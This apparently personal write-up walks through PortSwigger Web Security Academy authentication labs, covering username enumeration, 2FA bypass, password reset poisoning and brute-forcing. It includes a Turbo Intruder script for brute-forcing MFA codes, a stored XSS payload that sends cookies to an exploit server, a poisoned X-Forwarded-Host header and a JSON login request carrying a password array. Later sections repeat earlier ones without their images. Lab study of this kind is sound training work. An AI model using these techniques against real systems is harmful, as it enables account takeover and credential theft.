**Authentication** 

**Username enumeration via different responses**

From <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses> 


Intruder attack to grep invalid password first using username list to find valid username from messages. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e0ce7488-3d55-4b14-8a41-094ab13c7d13)



Our grep reveal valid username
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/11e47278-0510-4097-af58-7283ae85fa9e)


Now just used that username and parameter the password on intruder to get a 302 request indicating successful 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fc6a91b8-628e-4108-a25b-6fee1f20ada0)





**2FA simple bypass**

From <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass> 

Login and use MFA to go into your account 
https://0a1200b203eaf89c810b6c6800d3008f.web-security-academy.net/my-account?id=wiener
 
Notice the myaccount?id=wiener 

This 2fa can be bypassed by entering that into our url request 
Sign into carlos
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0bc50b2c-94a3-4fb8-91ca-97ac70403f51)

Bypassed
https://0a1200b203eaf89c810b6c6800d3008f.web-security-academy.net/my-account?id=carlos
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/edbc8b90-7e1b-44c2-bff9-dffe0da9346d)


***Username enumeration via subtly different responses***

From <https://0a14004e03284b858401912e006000fa.web-security-academy.net/login> 

Different response when looking for valid username
Notice no period and a trailing space 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f9fad7a5-f5ea-44a4-bf55-a7bc370a49da)



Brute forcing password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2534fbc4-ce8f-411d-9e5d-562041065406)





**Password reset broken logic**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic> 

Send password reset in valid account and reset password 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/be090d6e-54ca-4acd-8ebd-e9fede0f4fc4)


Change password of the user you want to change
We changed password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/98915b71-121b-44a2-b45d-c324e5fcb67f)



**Username enumeration via response timing**

From <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing> 

Lockout after numerous attempt 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4fcce00e-5de2-4665-84b0-a62a979ec207)



Can be bypass using X-Forwarded-For: 1 
Increment each time 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2b0ea7b6-9051-4e78-a521-db8197eb5546)




Use intruder pitchfork
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/58dd91db-b3d6-4014-bf2f-b14499a97ee5)



Increment payload 1 
Dictionary of username for payload 2
Set password to 100 length
Our parameter


Go to column and check for "Response Received" and "Response repeated"
The longer response are the one we are looking for
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fd52c525-341f-4508-9bdd-8b2246eb522a)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/30b93cac-0a76-4c0e-b557-4932715b360b)



Brute force password for access
Remember to use another value from 100 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8f3f17ec-dba7-4f7d-bcdd-0983d65a5878)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/edcac019-774f-476d-8c96-4ba06489ec83)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/16d6fc7b-1d06-4c65-bfd6-e05041c5afc0)



***Broken brute-force protection, IP block***

IP blocked after numerous attempt to login
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/53ab6463-d4de-4dc9-8d0a-8f5cf4c9a75f)


This is reset when you login with a legit account
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f9b62223-496e-40b6-a9e1-e6a427987836)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5c73a8e2-0974-40c2-bb95-ba96aa8d316b)



To bypass we need to alternate between a legit user carlos and a legit username and password

Send to intruder
Our dictionary of carlos alternating legit username
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/27cb2d07-9a66-4d67-bbc3-2d29795e73b8)


Our password dictionary of carlos and legitimate password of legitimate username
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5e2c7f63-04fa-43d5-bc28-827405382800)


Maximum resource pool 1 need to be set
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/216a0af3-617c-444d-844d-47b507f1979e)


Use pitchfork attack
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f62e57c4-2b24-4ab7-ac62-b0ded99c6098)

**Username enumeration via account lock**

From <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock> 

This one require burp suite professional but you can get over it by just doing 10 request individually 5 times to get a lockout on Community edition
Seem professional faster and community is just throttled
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/67460e88-0b46-426e-8e6b-da2bae1a231f)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3211d9c3-8e54-4898-b7b8-7c4df5ed08be)




If use professional here are the settings 
Cluster bomb 
Username parameter
And empty parameter in the end 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fcc760e9-a309-41f5-9c9d-051112502a8f)

Iterate 5 times
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e61c4f3f-cc4f-444f-b7a6-311f000f80b6)


Bruteforce password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2babb7fc-d151-4526-b53a-3094b1c018c6)


Different response which mean this is out login
Looks like lockout resets after successful login
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/87432f56-3eef-4340-82af-9ba37168ab76)


**2FA broken logic**

From <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic> 

Login with initial account 
We get a 2fa prompt
Notice the verify
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9c9b7b55-c986-43e8-9efc-d20d7c511c98)



On our successful 2fa we get the following response notice the verify=
We can change it to Carlos 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/602c07fb-ecc6-4168-a2f6-d3ac3c76f014)


Change to carlos and send request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/001f85f6-38c8-45ca-9c47-1bd71a606d3a)


Change to another user to bypass MFA with initial account 
Than send to intruder and bruteforce MFA
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8e25a317-0e57-4b87-8218-acbd8d24e724)



Payload used
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c193ec4b-ccfa-4f58-b79d-ce5f37214ba9)



Using turbo intruder cause it doesn’t throttle request

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1,
                           pipeline=True
                           )
    engine.start()

    for i in range(10000):
        engine.queue(target.req, '{0:04}'.format(i))

def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0b6fb6fd-360e-4bce-a710-baf1cdc6d932)
    





**Brute-forcing a stay-logged-in cookie**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie> 

Log in with initial log in given and capture request.
Stay log in checked. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e0352795-15bb-4dd8-bffb-2ec1b3c902a7)



Delete session to see if we get a request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e9224e7a-2752-430b-b86f-3d4528f61f14)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/760205eb-5abf-4052-bcde-1c249a185cf4)




Decode the bas64
stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1df136eb-f7cd-450e-8dae-25fb5854735e)


We got another hash. Need to identify it. MD5
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0989a73a-b472-43f1-ad44-7b28e8d62289)


So stay log in cookie is in a
Base64
Username:md5

Our Intruder setting
Payload processing by this order
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5092c4ca-f56b-40b8-b948-12eedd28176f)



Grep Update email
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0583ed22-42be-40bb-937a-29a3bb3aef93)




Got a hit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fabc912f-42cd-4795-9b08-e2a16fd775c4)




**Offline password cracking**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking> 

Signing in reveal that we have the same logged in cookie
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ccbe265c-0742-4364-a41d-5744e9254407)



Getting credential using stored xss
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/954add6d-ffae-485a-b085-35290a5a834a)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3f325fee-03d7-4231-89cd-a7568115b6d9)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/af1bc734-8b28-4e99-8d59-0eee7aafe04f)











Use hashcat Only using crackstation cause it fast
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/830ff21a-082b-4d09-875c-325c61685546)






**Password reset poisoning via middleware**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware> 


Apparently this user will click on any links in email that he receives
Send a password reset to burp repeater 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/25deb5ca-f9e4-4d1c-9da1-780b39ce8599)



Our repeater add xforward request to our exploit server 
X-Forwarded-Host: exploit-0a7500b9049219f882d560d2017700c7.exploit-server.net
And
Change to username you want to get
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/51070983-0a6f-4457-a6d1-5d78b0052e73)





We got it
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bcdd4988-c843-4277-a6a6-f1f99c3e01ea)





**Password brute-force via password change**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 

Sign in and play around with the password change function

If the two entries for the new password match, the account is locked

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cc4d275b-3c00-47bc-b86d-aa23abc860b7)






if you enter two different new passwords, an error message simply states Current password is incorrect
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7092e065-ff1b-418d-9fe1-a22b4cd9d1f7)

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 




If you enter a valid current password, but two different new passwords, the message says New passwords do not match. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/45d83020-4192-4c47-909f-14904ea1cc93)


From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 


We will be using the current password is incorrect on intruding an grepping New passwords do not match. 
Bruteforcing carlos
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/422d2140-59fb-451b-a534-9caa72861113)



A hit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bd85e135-6da0-48b2-b3fa-2f3d0cf7c6f4)



**Broken brute-force protection, multiple credentials per request**

From <https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request> 


Our capture logon response is in json 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/10de2446-bd43-488b-8cd0-c0ee8c3e6d54)



We can bruteforce by inputting an array of passwords from a dictionary attack file 

```
┌──(kali㉿kali)-[~/grep]
└─$ sed -i 's/.*/"&",/' pass.txt | cat pass.txt      
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
```


```
POST /login HTTP/2
Host: 0a37008704bb9abc8132308d00660097.web-security-academy.net
Cookie: session=9bdwFQvaZDkZbRN70aKgad4YILs32nUP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a37008704bb9abc8132308d00660097.web-security-academy.net/login
Content-Type: application/json
Content-Length: 1188
Origin: https://0a37008704bb9abc8132308d00660097.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"carlos","password":  ["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f78affaf-0e2f-437c-a8f9-e06369b0ba9f)







**2FA bypass using a brute-force attack**

From <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ffc08457-33d4-4b73-b563-4b331ce2fd96)



Initial login shows a mfa prompt

Two unsuccessful mfa input will not lock out user but will sign them out 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f9280245-61a5-4860-a193-af5716388a2d)


We can use macro on burp to circumvent this 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/e6da53e2-2611-438f-a2c5-757e312b8106)





Our macro
Make sure the last request return to the mfa input 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c78334a4-1d02-42b5-ab0a-60dbdb5c15f4)



Add Macro to session rule
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/edf6837b-5db9-49f2-a21b-1557c64ab898)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f6d43102-5ab7-40d6-bccf-ddec61376cc7)





Now pass to intruder
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3d04e72e-971e-410c-af28-0972e6d3e8fa)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fca5472c-ac44-4780-ada0-330a37a56abd)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/874345e8-7c09-46d5-8354-9b17707aa601)



We got mfa 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5cc10770-e8c5-481c-89e5-9e4f1e766a81)







Use hashcat Only using crackstation cause it fast






**Password reset poisoning via middleware**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware> 


Apparently this user will click on any links in email that he receives
Send a password reset to burp repeater 



Our repeater add xforward request to our exploit server 
X-Forwarded-Host: exploit-0a7500b9049219f882d560d2017700c7.exploit-server.net
And
Change to username you want to get





We got it





**Password brute-force via password change**

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 

Sign in and play around with the password change function

If the two entries for the new password match, the account is locked

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 






if you enter two different new passwords, an error message simply states Current password is incorrect

From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 




If you enter a valid current password, but two different new passwords, the message says New passwords do not match. 


From <https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change> 


We will be using the current password is incorrect on intruding an grepping New passwords do not match. 
Bruteforcing carlos



A hit



**Broken brute-force protection, multiple credentials per request**

From <https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request> 


Our capture logon response is in json 



We can bruteforce by inputting an array of passwords from a dictionary attack file 

```
┌──(kali㉿kali)-[~/grep]
└─$ sed -i 's/.*/"&",/' pass.txt | cat pass.txt      
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
```


```
POST /login HTTP/2
Host: 0a37008704bb9abc8132308d00660097.web-security-academy.net
Cookie: session=9bdwFQvaZDkZbRN70aKgad4YILs32nUP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a37008704bb9abc8132308d00660097.web-security-academy.net/login
Content-Type: application/json
Content-Length: 1188
Origin: https://0a37008704bb9abc8132308d00660097.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"carlos","password":  ["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]
}
```







**2FA bypass using a brute-force attack**

From <https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack> 



Initial login shows a mfa prompt

Two unsuccessful mfa input will not lock out user but will sign them out 


We can use macro on burp to circumvent this 





Our macro
Make sure the last request return to the mfa input 



Add Macro to session rule





Now pass to intruder






We got mfa 




